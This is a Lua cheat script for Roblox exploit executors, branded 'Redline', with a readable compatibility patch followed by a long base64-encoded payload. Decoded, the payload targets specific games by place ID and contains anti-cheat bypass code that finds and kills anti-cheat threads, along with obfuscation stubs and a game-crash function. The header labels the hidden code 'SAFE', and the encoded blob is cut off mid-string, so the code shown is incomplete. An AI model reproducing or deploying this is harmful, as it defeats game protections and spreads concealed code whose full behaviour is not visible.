
-- =========================
-- XENO & SOLARA COMPAT PATCH
-- =========================
do
    -- Universal HTTP (safe if used anywhere)
    _G.__redline_httpGet = _G.__redline_httpGet or function(url)
        if syn and syn.request then
            return syn.request({Url = url, Method = "GET"}).Body
        elseif http and http.request then
            return http.request({Url = url, Method = "GET"}).Body
        else
            return game:HttpGet(url)
        end
    end

    -- Safe ScreenGui parenting helper
    _G.__redline_parentGui = _G.__redline_parentGui or function(gui)
        local CoreGui = game:GetService("CoreGui")
        local Players = game:GetService("Players")
        local ok = pcall(function()
            gui.Parent = CoreGui
        end)
        if not ok or not gui.Parent then
            gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
        end
        return gui
    end

    -- Executor info (non-breaking)
    local exec =
        (identifyexecutor and identifyexecutor())
        or (syn and "Synapse")
        or (KRNL_LOADED and "Krnl")
        or "Unknown"
    print("[Redline] Executor:", exec)
end
-- =========================
-- END COMPAT PATCH
-- =========================




-- ==========================================
-- Redline FINAL Obfuscated Script (SAFE)
-- Mobile + PC + GitHub RAW compatible
-- ==========================================

local data = [[
Ci0tID09PT09PT09PT09PT09PT09PT09PT09PT0KLS0gVUktT05MWSBGT1JDRSBSRUQgUEFUQ0gKLS0gQWZmZWN0cyBPTkxZIFNjcmVlbkd1aSBlbGVtZW50cyAoVUkpLCBub3QgdGhlIGdhbWUgd29ybGQKLS0gPT09PT09PT09PT09PT09PT09PT09PT09PQpkbwogICAgbG9jYWwgUkVEID0gQ29sb3IzLmZyb21SR0IoMjU1LCAwLCAwKQoKICAgIGxvY2FsIGZ1bmN0aW9uIGxvb2tzV2hpdGUoYykKICAgICAgICByZXR1cm4gdHlwZW9mKGMpID09ICJDb2xvcjMiIGFuZCBjLlIgPj0gMC44NSBhbmQgYy5HID49IDAuODUgYW5kIGMuQiA+PSAwLjg1CiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBhcHBseSh2KQogICAgICAgIGlmIHY6SXNBKCJUZXh0TGFiZWwiKSBvciB2OklzQSgiVGV4dEJ1dHRvbiIpIG9yIHY6SXNBKCJUZXh0Qm94IikgdGhlbgogICAgICAgICAgICBpZiBsb29rc1doaXRlKHYuVGV4dENvbG9yMykgdGhlbiB2LlRleHRDb2xvcjMgPSBSRUQgZW5kCiAgICAgICAgICAgIGlmIHYuVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSA8IDEgYW5kIGxvb2tzV2hpdGUodi5UZXh0U3Ryb2tlQ29sb3IzKSB0aGVuCiAgICAgICAgICAgICAgICB2LlRleHRTdHJva2VDb2xvcjMgPSBSRUQKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZWlmIHY6SXNBKCJVSVN0cm9rZSIpIHRoZW4KICAgICAgICAgICAgaWYgbG9va3NXaGl0ZSh2LkNvbG9yKSB0aGVuIHYuQ29sb3IgPSBSRUQgZW5kCiAgICAgICAgZWxzZWlmIHY6SXNBKCJJbWFnZUxhYmVsIikgb3IgdjpJc0EoIkltYWdlQnV0dG9uIikgdGhlbgogICAgICAgICAgICBpZiBsb29rc1doaXRlKHYuSW1hZ2VDb2xvcjMpIHRoZW4gdi5JbWFnZUNvbG9yMyA9IFJFRCBlbmQKICAgICAgICBlbHNlaWYgdjpJc0EoIkZyYW1lIikgdGhlbgogICAgICAgICAgICBpZiBsb29rc1doaXRlKHYuQmFja2dyb3VuZENvbG9yMykgdGhlbiB2LkJhY2tncm91bmRDb2xvcjMgPSBSRUQgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKCiAgICBsb2NhbCBmdW5jdGlvbiBob29rKGd1aSkKICAgICAgICBmb3IgXyx2IGluIGlwYWlycyhndWk6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgcGNhbGwoYXBwbHksIHYpCiAgICAgICAgZW5kCiAgICAgICAgZ3VpLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHYpCiAgICAgICAgICAgIHBjYWxsKGFwcGx5LCB2KQogICAgICAgIGVuZCkKICAgIGVuZAoKICAgIC0tIEFwcGx5IE9OTFkgdG8gU2NyZWVuR3VpcyAoVUkpCiAgICBmb3IgXyx2IGluIGlwYWlycyhnYW1lOkdldFNlcnZpY2UoIkNvcmVHdWkiKTpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIHY6SXNBKCJTY3JlZW5HdWkiKSB0aGVuCiAgICAgICAgICAgIGhvb2sodikKICAgICAgICBlbmQKICAgIGVuZAoKICAgIC0tIENhdGNoIGZ1dHVyZSBVSQogICAgZ2FtZTpHZXRTZXJ2aWNlKCJDb3JlR3VpIikuQ2hpbGRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHYpCiAgICAgICAgaWYgdjpJc0EoIlNjcmVlbkd1aSIpIHRoZW4KICAgICAgICAgICAgaG9vayh2KQogICAgICAgIGVuZAogICAgZW5kKQplbmQKLS0gPT09PT09PT09PT09PT09PT09PT09PT09PQotLSBFTkQgVUktT05MWSBQQVRDSAotLSA9PT09PT09PT09PT09PT09PT09PT09PT09CgoKaWYgZ2V0Z2VudigpLmxvYWRlZCB0aGVuIAogICAgcmV0dXJuCmVuZCAKCmdldGdlbnYoKS5sb2FkZWQgPSB0cnVlIAoKbG9jYWwgVHdlZW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQpsb2NhbCBTdGFydGVyR3VpID0gZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIikKCmxvY2FsIGd1aSA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIikKZ3VpLklnbm9yZUd1aUluc2V0ID0gdHJ1ZQpndWkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyOldhaXRGb3JDaGlsZCgiUGxheWVyR3VpIikKLS0g8J+UtCBQaW5rIGRyYWdnYWJsZSB0b2dnbGUgYnV0dG9uCmxvY2FsIFVzZXJJbnB1dFNlcnZpY2UgPSBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKQoKbG9jYWwgdG9nZ2xlQnV0dG9uID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIikKdG9nZ2xlQnV0dG9uLk5hbWUgPSAiUmVkbGluZVRvZ2dsZSIKdG9nZ2xlQnV0dG9uLlBhcmVudCA9IGd1aQp0b2dnbGVCdXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLCAxNDAsIDAsIDQwKQp0b2dnbGVCdXR0b24uUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMjAsIDAuNSwgLTIwKQp0b2dnbGVCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTA1LCAxODApIC0tIHBpbmsKdG9nZ2xlQnV0dG9uLlRleHQgPSAiUmVkbGluZSIKdG9nZ2xlQnV0dG9uLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsMjU1LDI1NSkKdG9nZ2xlQnV0dG9uLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAp0b2dnbGVCdXR0b24uVGV4dFNpemUgPSAxNgp0b2dnbGVCdXR0b24uQm9yZGVyU2l6ZVBpeGVsID0gMAp0b2dnbGVCdXR0b24uQXV0b0J1dHRvbkNvbG9yID0gdHJ1ZQoKbG9jYWwgY29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIHRvZ2dsZUJ1dHRvbikKY29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDEyKQoKLS0gRHJhZ2dhYmxlIChidXR0b24gb25seSkKbG9jYWwgZHJhZ2dpbmcgPSBmYWxzZQpsb2NhbCBkcmFnU3RhcnQKbG9jYWwgc3RhcnRQb3MKCmxvY2FsIGZ1bmN0aW9uIHVwZGF0ZShpbnB1dCkKCWxvY2FsIGRlbHRhID0gaW5wdXQuUG9zaXRpb24gLSBkcmFnU3RhcnQKCXRvZ2dsZUJ1dHRvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygKCQlzdGFydFBvcy5YLlNjYWxlLAoJCXN0YXJ0UG9zLlguT2Zmc2V0ICsgZGVsdGEuWCwKCQlzdGFydFBvcy5ZLlNjYWxlLAoJCXN0YXJ0UG9zLlkuT2Zmc2V0ICsgZGVsdGEuWQoJKQplbmQKCnRvZ2dsZUJ1dHRvbi5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCglpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEKCW9yIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoIHRoZW4KCQlkcmFnZ2luZyA9IHRydWUKCQlkcmFnU3RhcnQgPSBpbnB1dC5Qb3NpdGlvbgoJCXN0YXJ0UG9zID0gdG9nZ2xlQnV0dG9uLlBvc2l0aW9uCgoJCWlucHV0LkNoYW5nZWQ6Q29ubmVjdChmdW5jdGlvbigpCgkJCWlmIGlucHV0LlVzZXJJbnB1dFN0YXRlID09IEVudW0uVXNlcklucHV0U3RhdGUuRW5kIHRoZW4KCQkJCWRyYWdnaW5nID0gZmFsc2UKCQkJZW5kCgkJZW5kKQoJZW5kCmVuZCkKCnRvZ2dsZUJ1dHRvbi5JbnB1dENoYW5nZWQ6Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKCWlmIChpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZU1vdmVtZW50CglvciBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCkgYW5kIGRyYWdnaW5nIHRoZW4KCQl1cGRhdGUoaW5wdXQpCgllbmQKZW5kKQoKVXNlcklucHV0U2VydmljZS5JbnB1dENoYW5nZWQ6Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKCWlmIGRyYWdnaW5nIHRoZW4KCQl1cGRhdGUoaW5wdXQpCgllbmQKZW5kKQoKCmxvY2FsIGZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCmZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgMjcwLCAwLCA4MCkKZnJhbWUuUG9zaXRpb24gPSBVRGltMi5uZXcoMSwgLTMwMCwgMCwgLTEwMCkKZnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1LCAyNSwgMjUpCmZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwLjE1CmZyYW1lLkJvcmRlclNpemVQaXhlbCA9IDAKZnJhbWUuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLCAwKQpmcmFtZS5QYXJlbnQgPSBndWkKZnJhbWUuVmlzaWJsZSA9IGZhbHNlCgpsb2NhbCB0aXRsZSA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKdGl0bGUuUGFyZW50ID0gZnJhbWUKdGl0bGUuU2l6ZSA9IFVEaW0yLm5ldygxLCAtMjAsIDAsIDI1KQp0aXRsZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAxMCwgMCwgOCkKdGl0bGUuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKdGl0bGUuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCnRpdGxlLlRleHRTaXplID0gMTgKdGl0bGUuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwyNTUsMjU1KQp0aXRsZS5UZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdAoKbG9jYWwgdGV4dCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKdGV4dC5QYXJlbnQgPSBmcmFtZQp0ZXh0LlNpemUgPSBVRGltMi5uZXcoMSwgLTIwLCAxLCAtNDApCnRleHQuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTAsIDAsIDMwKQp0ZXh0LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCnRleHQuRm9udCA9IEVudW0uRm9udC5Hb3RoYW0KdGV4dC5UZXh0U2l6ZSA9IDE1CnRleHQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIxMCwyMTAsMjEwKQp0ZXh0LlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0CnRleHQuVGV4dFdyYXBwZWQgPSB0cnVlCgpsb2NhbCBmdW5jdGlvbiBub3RpZnkodGl0bGVUZXh0LCBtc2csIHRpbWUpCglmcmFtZS5WaXNpYmxlID0gdHJ1ZQoJdGl0bGUuVGV4dCA9IHRpdGxlVGV4dAoJdGV4dC5UZXh0ID0gbXNnCgoJVHdlZW5TZXJ2aWNlOkNyZWF0ZShmcmFtZSwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuUXVpbnQpLCB7CgkJUG9zaXRpb24gPSBVRGltMi5uZXcoMSwgLTI4MCwgMCwgMzApCgl9KTpQbGF5KCkKCgl0YXNrLndhaXQodGltZSkKCglsb2NhbCB0d2VlbiA9IFR3ZWVuU2VydmljZTpDcmVhdGUoZnJhbWUsIFR3ZWVuSW5mby5uZXcoMC40LCBFbnVtLkVhc2luZ1N0eWxlLlF1aW50KSwgewoJCVBvc2l0aW9uID0gVURpbTIubmV3KDEsIC0zMDAsIDAsIC0xMDApCgl9KQoJdHdlZW46UGxheSgpCgl0d2Vlbi5Db21wbGV0ZWQ6V2FpdCgpCglmcmFtZS5WaXNpYmxlID0gZmFsc2UKZW5kCgotLSBub3RpZgpub3RpZnkoIlJlZGxpbmUiLCAiTG9hZGluZ+KApiIsIDEyKQp0YXNrLndhaXQoMykKbm90aWZ5KCJGaXhlcyEiLCAiMTIuMTQuMjAyNVxuQ2hlY2sgRGlzY29yZCBGb3IgTG9ncyEiLCAxMCkKCgppZiBMUEhfT0JGVVNDQVRFRCA9PSBuaWwgdGhlbgogICAgbG9jYWwgYXNzZXJ0ID0gYXNzZXJ0CiAgICBsb2NhbCB0eXBlID0gdHlwZQogICAgbG9jYWwgc2V0ZmVudiA9IHNldGZlbnYKICAgIExQSF9FTkNOVU0gPSBmdW5jdGlvbih0b0VuY3J5cHQsIC4uLikKICAgICAgICBhc3NlcnQodHlwZSh0b0VuY3J5cHQpID09ICJudW1iZXIiIGFuZCAjey4uLn0gPT0gMCwgIkxQSF9FTkNOVU0gb25seSBhY2NlcHRzIGEgc2luZ2xlIGNvbnN0YW50IGRvdWJsZSBvciBpbnRlZ2VyIGFzIGFuIGFyZ3VtZW50LiIpCiAgICAgICAgcmV0dXJuIHRvRW5jcnlwdAogICAgZW5kCiAgICBMUEhfTlVNRU5DID0gTFBIX0VOQ05VTQogICAgTFBIX0VOQ1NUUiA9IGZ1bmN0aW9uKHRvRW5jcnlwdCwgLi4uKQogICAgICAgIGFzc2VydCh0eXBlKHRvRW5jcnlwdCkgPT0gInN0cmluZyIgYW5kICN7Li4ufSA9PSAwLCAiTFBIX0VOQ1NUUiBvbmx5IGFjY2VwdHMgYSBzaW5nbGUgY29uc3RhbnQgc3RyaW5nIGFzIGFuIGFyZ3VtZW50LiIpCiAgICAgICAgcmV0dXJuIHRvRW5jcnlwdAogICAgZW5kCiAgICBMUEhfU1RSRU5DID0gTFBIX0VOQ1NUUgogICAgTFBIX0VOQ0ZVTkMgPSBmdW5jdGlvbih0b0VuY3J5cHQsIGVuY0tleSwgZGVjS2V5LCAuLi4pCiAgICAgICAgCiAgICAgICAgYXNzZXJ0KHR5cGUodG9FbmNyeXB0KSA9PSAiZnVuY3Rpb24iIGFuZCB0eXBlKGVuY0tleSkgPT0gInN0cmluZyIgYW5kICN7Li4ufSA9PSAwLCAiTFBIX0VOQ0ZVTkMgYWNjZXB0cyBhIGNvbnN0YW50IGZ1bmN0aW9uLCBjb25zdGFudCBzdHJpbmcsIGFuZCBzdHJpbmcgdmFyaWFibGUgYXMgYXJndW1lbnRzLiIpCiAgICAgICAgcmV0dXJuIHRvRW5jcnlwdAogICAgZW5kCiAgICBMUEhfRlVOQ0VOQyA9IExQSF9FTkNGVU5DCiAgICBMUEhfSklUID0gZnVuY3Rpb24oZiwgLi4uKQogICAgICAgIGFzc2VydCh0eXBlKGYpID09ICJmdW5jdGlvbiIgYW5kICN7Li4ufSA9PSAwLCAiTFBIX0pJVCBvbmx5IGFjY2VwdHMgYSBzaW5nbGUgY29uc3RhbnQgZnVuY3Rpb24gYXMgYW4gYXJndW1lbnQuIikKICAgICAgICByZXR1cm4gZgogICAgZW5kCiAgICBMUEhfSklUX01BWCA9IExQSF9KSVQKICAgIExQSF9OT19WSVJUVUFMSVpFID0gZnVuY3Rpb24oZiwgLi4uKQogICAgICAgIGFzc2VydCh0eXBlKGYpID09ICJmdW5jdGlvbiIgYW5kICN7Li4ufSA9PSAwLCAiTFBIX05PX1ZJUlRVQUxJWkUgb25seSBhY2NlcHRzIGEgc2luZ2xlIGNvbnN0YW50IGZ1bmN0aW9uIGFzIGFuIGFyZ3VtZW50LiIpCiAgICAgICAgcmV0dXJuIGYKICAgIGVuZAogICAgTFBIX05PX1VQVkFMVUVTID0gZnVuY3Rpb24oZiwgLi4uKQogICAgICAgIGFzc2VydCh0eXBlKHNldGZlbnYpID09ICJmdW5jdGlvbiIsICJMUEhfTk9fVVBWQUxVRVMgY2FuIG9ubHkgYmUgdXNlZCBvbiBMdWEgdmVyc2lvbnMgd2l0aCBnZXRmZW52ICYgc2V0ZmVudiIpCiAgICAgICAgYXNzZXJ0KHR5cGUoZikgPT0gImZ1bmN0aW9uIiBhbmQgI3suLi59ID09IDAsICJMUEhfTk9fVVBWQUxVRVMgb25seSBhY2NlcHRzIGEgc2luZ2xlIGNvbnN0YW50IGZ1bmN0aW9uIGFzIGFuIGFyZ3VtZW50LiIpCiAgICAgICAgbG9jYWwgZW52ID0gZ2V0cmVudigpCiAgICAgICAgcmV0dXJuIHNldGZlbnYoCiAgICAgICAgICAgIExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKC4uLikKICAgICAgICAgICAgICAgIHJldHVybiBmdW5jKC4uLikKICAgICAgICAgICAgZW5kKSwKICAgICAgICAgICAgc2V0bWV0YXRhYmxlKAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGZ1bmMgPSBmCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIF9faW5kZXggPSBlbnYsCiAgICAgICAgICAgICAgICAgICAgX19uZXdpbmRleCA9IGVudgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApCiAgICAgICAgKQogICAgZW5kCiAgICBMUEhfQ1JBU0ggPSBmdW5jdGlvbiguLi4pCiAgICAgICAgYXNzZXJ0KCN7Li4ufSA9PSAwLCAiTFBIX0NSQVNIIGRvZXMgbm90IGFjY2VwdCBhbnkgYXJndW1lbnRzLiIpCiAgICAgICAgZ2FtZTpTaHV0ZG93bigpCiAgICAgICAgd2hpbGUgdHJ1ZSBkbyBlbmQKICAgIGVuZAogICAgTFJNX0lzVXNlclByZW1pdW0gPSBmYWxzZQogICAgTFJNX0xpbmtlZERpc2NvcmRJRCA9ICIwIgogICAgTFJNX1NjcmlwdE5hbWUgPSAiUmVkbGluZSIKICAgIExSTV9Ub3RhbEV4ZWN1dGlvbnMgPSAwCiAgICBMUk1fU2Vjb25kc0xlZnQgPSBtYXRoLmh1Z2UKICAgIExSTV9Vc2VyTm90ZSA9ICJEZXZlbG9wZXIiOwplbmQ7Cgpsb2NhbCBHYW1lX05hbWUgPSAoZ2FtZS5QbGFjZUlkID09IDQ5OTEyMTQ0MzcgYW5kICJUb3duIikgb3IgKGdhbWUuUGxhY2VJZCA9PSAxODY0MjQyMTc3NyBhbmQgIlRoZSBCcm9ueCIpIG9yIChnYW1lLlBsYWNlSWQgPT0gMTY0NzI1Mzg2MDMgYW5kICJUaGUgQnJvbngiKSBvciAoZ2FtZS5QbGFjZUlkID09IDEzNjQzODA3NTM5IGFuZCAiU291dGggQnJvbngiKSBvciAoZ2FtZS5QbGFjZUlkID09IDkzNjEyNjgyNzgwNTYyIGFuZCAiU291dGggQnJvbngiKSBvciAoZ2FtZS5QbGFjZUlkID09IDE0NDEzNDc1MjM1IGFuZCAiU291dGggQnJvbngiKSBvciAoZ2FtZS5QbGFjZUlkID09IDEwNDcxNTU0MjMzMDg5NiBhbmQgIkJsb2NrU3BpbiIpIG9yIChnYW1lLlBsYWNlSWQgPT0gNzE2MDA0NTk4MzEzMzMgYW5kICJTdHJlZXQgTGlmZSIpIG9yICJVbml2ZXJzYWwiCmlmIG5vdCBnZXRleGVjdXRvcm5hbWUgdGhlbgogICAgZ2V0ZXhlY3V0b3JuYW1lID0gaWRlbnRpZnlleGVjdXRvcgplbmQKCmxvY2FsIFNvbGFyYSA9IHN0cmluZy5tYXRjaChnZXRleGVjdXRvcm5hbWUoKSwgIlNvbGFyYSIpID09ICJTb2xhcmEiIG9yIHN0cmluZy5tYXRjaChnZXRleGVjdXRvcm5hbWUoKSwgIlhlbm8iKSA9PSAiWGVubyIgb3IgZ2V0ZXhlY3V0b3JuYW1lKCkgPT0gc3RyaW5nLm1hdGNoKGdldGV4ZWN1dG9ybmFtZSgpLCAiWm9yYXJhIikgPT0gIlpvcmFyYSI7Cgpsb2NhbCBjbG9uZXJlZiA9IGNsb25lcmVmIG9yIGZ1bmN0aW9uKC4uLikgcmV0dXJuIC4uLiBlbmQKCmxvY2FsIFNlcnZpY2VzID0gc2V0bWV0YXRhYmxlKHt9LCB7CiAgICBfX2luZGV4ID0gTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oc2VsZiwgc2VydmljZSwga2V5KQogICAgICAgIGlmIFNvbGFyYSBhbmQgKHNlcnZpY2UgPT0gIlZpcnR1YWxJbnB1dE1hbmFnZXIiKSBhbmQgKEdhbWVfTmFtZSA9PSAiVGhlIEJyb254IikgdGhlbgogICAgICAgICAgICByZXR1cm4ge1NlbmRLZXlFdmVudCA9IGZ1bmN0aW9uKCkgZW5kfQogICAgICAgIGVuZAogICAgICAgIHJldHVybiBjbG9uZXJlZihnYW1lOkdldFNlcnZpY2Uoc2VydmljZSkpCiAgICBlbmQpCn0pCgppZiBHYW1lX05hbWUgPT0gIlNvdXRoIEJyb254IiBhbmQgbm90IFNvbGFyYSB0aGVuCgogICAgICAgICBsb2NhbCBfZ2V0YWxsdGhyZWFkcyA9IExQSF9KSVRfTUFYKGZ1bmN0aW9uKCkKICAgICAgICAgICAgbG9jYWwgdGhyZWFkcyA9IHt9CiAgICAgICAgICAgIGZvciBpLCB2IGluIGdldHJlZygpIGRvCiAgICAgICAgICAgICAgICBpZiB0eXBlKHYpID09ICd0aHJlYWQnIHRoZW4KICAgICAgICAgICAgICAgICAgICB0YWJsZS5pbnNlcnQodGhyZWFkcywgdikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgcmV0dXJuIHRocmVhZHMKICAgICAgICBlbmQpCgogICAgICAgIGxvY2FsIF9nZXR0ZW52ID0gTFBIX0pJVF9NQVgoZnVuY3Rpb24oVGhyZWFkKQogICAgICAgICAgICByZXR1cm4gZ2V0ZmVudihkZWJ1Zy5pbmZvKFRocmVhZCwgMSwgJ2YnKSkKICAgICAgICBlbmQpCgogICAgICAgIGlmIGdldHRlbnYgdGhlbgogICAgICAgICAgICBfZ2V0dGVudiA9IGdldHRlbnYKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgRmlsdGVyX05pbF9JbnN0YW5jZXMgPSBMUEhfSklUX01BWChmdW5jdGlvbihOYW1lKSAKICAgICAgICAgICAgbG9jYWwgRm91bmQgPSBuaWwgCgogICAgICAgICAgICBmb3IgXywgT2JqZWN0IGluIGdldG5pbGluc3RhbmNlcygpIGRvICAKICAgICAgICAgICAgICAgIGlmIHRvc3RyaW5nKE9iamVjdCk6ZmluZChOYW1lKSB0aGVuIAogICAgICAgICAgICAgICAgICAgIEZvdW5kID0gT2JqZWN0CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICByZXR1cm4gRm91bmQKICAgICAgICBlbmQpCgogICAgICAgIGxvY2FsIEZpbHRlcl9UYWJsZSA9IExQSF9KSVRfTUFYKGZ1bmN0aW9uKFRhYmxlLCBOYW1lKQogICAgICAgICAgICBsb2NhbCBGb3VuZCwgSW5kZXggPSBuaWwsIG5pbAoKICAgICAgICAgICAgZm9yIF8sIE9iamVjdCBpbiBUYWJsZSBkbyAKCiAgICAgICAgICAgICAgICBpZiB0b3N0cmluZyhfKTpsb3dlcigpOmZpbmQodG9zdHJpbmcoTmFtZSk6bG93ZXIoKSkgdGhlbiAKICAgICAgICAgICAgICAgICAgICBGb3VuZCA9IE9iamVjdAogICAgICAgICAgICAgICAgICAgIEluZGV4ID0gXwogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgcmV0dXJuIEZvdW5kLCBJbmRleAogICAgICAgIGVuZCkKCiAgICAgICAgbG9jYWwgU2VhcmNoX1RocmVhZHMgPSBMUEhfSklUX01BWChmdW5jdGlvbihUYWJsZSwgVmFyaWFibGUpCiAgICAgICAgICAgIGxvY2FsIFRocmVhZHMgPSB7fQoKICAgICAgICAgICAgZm9yIE5PLCBfdGhyZWFkIGluIHBhaXJzKFRhYmxlKSBkbwogICAgICAgICAgICAgICAgbG9jYWwgVF9FTlYgPSBfZ2V0dGVudihfdGhyZWFkKQoKICAgICAgICAgICAgICAgIGlmIFRfRU5WW1ZhcmlhYmxlXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KFRocmVhZHMsIF90aHJlYWQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICByZXR1cm4gVGhyZWFkcwogICAgICAgIGVuZCkKCiAgICAgICAgbG9jYWwgR2V0X0FudGlDaGVhdF9UaHJlYWRzID0gTFBIX0pJVF9NQVgoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBUaHJlYWRzID0gX2dldGFsbHRocmVhZHMoKQogICAgICAgICAgICBsb2NhbCBXZUhhdmVBSGFja2VyID0gU2VhcmNoX1RocmVhZHMoVGhyZWFkcywgJ1dlSGF2ZUFIYWNrZXInKQogICAgICAgICAgICBpZiBXZUhhdmVBSGFja2VyWzFdIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiBXZUhhdmVBSGFja2VyCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKCiAgICAgICAgbG9jYWwgQW50aUNoZWF0X1RocmVhZHMgPSB7fQogICAgICAgIGxvY2FsIEFudGlDaGVhdF9FbmNvZGVkID0gewogICAgICAgICAgICBbMV0gPSAiaUZQamJybHVmdlN6c1l1ckNDZFdlRmJQZU5CV3p4eXdHV0xOcHpnUVZWdmtMYW9ESmpJbWdXRkVUV1Z6YzJGblpWUjVjR1U9IiwKICAgICAgICAgICAgWzJdID0gIkFqaW1oWXh1VGNCeEx0ZXRQVHFMUUtzZHNqRGlXTnBzUFNvWFRvRmZ2ZnR1ZlNuTFRlbVpVVktUV1Z6YzJGblpWVWxabTg9IiwKICAgICAgICAgICAgWzNdID0gIlZGZXZjV3h1WkhsdkZXZWpKRVJOWHVwSkROeHZqbklCUEhCTlpnU01ITk9lUVVSSUNrc0lGRVRXVnpjMkZuWlZSNWNHVT0iLAogICAgICAgICAgICBbNF0gPSAiUkpMSFBxamd5WXdpR0tmZ1NkSVNpQ3B2ekdtZEpLQmtXVU1NWkh4dGlwQ21pdmpaZFh6RFdzVFdWemMyRm5aVWxESGJJZEE9PSIKICAgICAgICB9CgogICAgICAgIGxvY2FsIEFudGlfQ2hlYXRfU2NyaXB0ID0gRmlsdGVyX05pbF9JbnN0YW5jZXMoJz8nKQoKICAgICAgICBpZiBub3QgQW50aV9DaGVhdF9TY3JpcHQgdGhlbgogICAgICAgICAgICByZXBlYXQgdGFzay53YWl0KCkKICAgICAgICAgICAgQW50aV9DaGVhdF9TY3JpcHQgPSBGaWx0ZXJfTmlsX0luc3RhbmNlcygnPycpCiAgICAgICAgICAgIHVudGlsIEFudGlfQ2hlYXRfU2NyaXB0fj1uaWwKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgQW50aUNoZWF0X0Z1bmN0aW9uLCBGdW5jdGlvbl9JbmRleCA9IEZpbHRlcl9UYWJsZShnZXRzZW52KEFudGlfQ2hlYXRfU2NyaXB0KSwgIkhQdiIpCiAgICAgICAgaWYgbm90IEFudGlDaGVhdF9GdW5jdGlvbiB0aGVuCiAgICAgICAgICAgIHJlcGVhdCB0YXNrLndhaXQoKQogICAgICAgICAgICBBbnRpX0NoZWF0X1NjcmlwdCA9IEZpbHRlcl9OaWxfSW5zdGFuY2VzKCc/JykKICAgICAgICAgICAgQW50aUNoZWF0X0Z1bmN0aW9uLCBGdW5jdGlvbl9JbmRleCA9IEZpbHRlcl9UYWJsZShnZXRzZW52KEFudGlfQ2hlYXRfU2NyaXB0KSwgIkhQdiIpCgogICAgICAgICAgICB1bnRpbCBBbnRpQ2hlYXRfRnVuY3Rpb25+PW5pbAogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBLaWxsYWJsZV9UaHJlYWRzID0ge1sxXSA9IHRydWUsIFszXSA9IHRydWUsIFs0XSA9IHRydWV9CgogICAgICAgIGxvY2FsIFhWTlBfTC